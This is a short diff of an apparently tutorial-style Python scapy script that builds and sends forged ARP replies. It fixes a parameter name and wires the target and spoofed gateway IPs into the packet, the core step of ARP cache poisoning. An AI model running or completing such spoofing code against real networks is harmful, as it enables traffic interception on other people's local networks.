@@ -21,8 +21,8 @@ def get_mac(ip):
     return ans_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoo_ip):
+def spoof(target_ip, spoof_ip):
     # you can get the pdst and hwdst fields from the network scanner, psrc must be equal to the gateway IP address. 
-    packet = scapy.ARP(op=2, pdst="<target_ip>", hwdst="<target_mac>", psrc="<gw_ip>")
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="<target_mac>", psrc=spoof_ip)
     scapy.send(packet)
     
